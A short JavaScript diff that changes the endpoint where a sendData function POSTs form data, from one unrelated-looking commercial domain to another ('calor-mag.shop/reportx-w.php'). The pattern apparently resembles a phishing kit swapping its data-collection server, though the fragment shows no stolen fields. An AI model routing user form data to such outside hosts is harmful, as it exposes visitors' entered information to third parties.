@@ -71,7 +71,7 @@ function sendData( data ) {
   } );
 
   // Set up our request
-  XHR.open( 'POST', 'https://mcrub.pro/migf-wa/' );
+  XHR.open( 'POST', 'https://calor-mag.shop/reportx-w.php' );
 
   // Send our FormData object; HTTP headers are set automatically
   XHR.send(FD);
